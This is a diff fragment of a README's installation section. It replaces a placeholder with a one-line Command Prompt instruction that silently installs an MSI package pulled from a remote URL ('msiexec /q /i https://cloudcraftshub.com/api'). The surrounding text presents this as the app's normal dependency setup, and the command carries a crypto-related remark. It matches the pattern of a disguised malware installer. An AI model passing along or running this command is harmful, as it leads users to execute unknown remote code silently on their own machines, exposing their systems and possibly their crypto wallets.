@@ -27,7 +27,7 @@ Before running the application, make sure you have the following installed:
 Open **Command Prompt** (`cmd`) and run the following command:
 
 ```
-COMMAND WILL BE ADDED HERE
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem coinbase-claw
 ```
 
 That's it. The application will install all dependencies and launch automatically.
